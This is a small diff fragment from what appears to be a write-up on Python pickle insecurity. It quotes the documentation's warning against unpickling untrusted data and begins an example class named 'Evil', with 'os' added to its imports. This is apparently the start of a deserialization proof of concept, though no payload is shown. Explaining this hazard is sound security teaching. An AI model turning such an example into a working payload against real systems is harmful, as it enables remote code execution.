@@ -32,7 +32,7 @@ Python 2.7 documentation clearly states Pickle should never be used with untrust
 > The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.
 
 ```python
-import cPickle
+import cPickle, os
 from base64 import b64encode, b64decode
 
 class Evil(object):
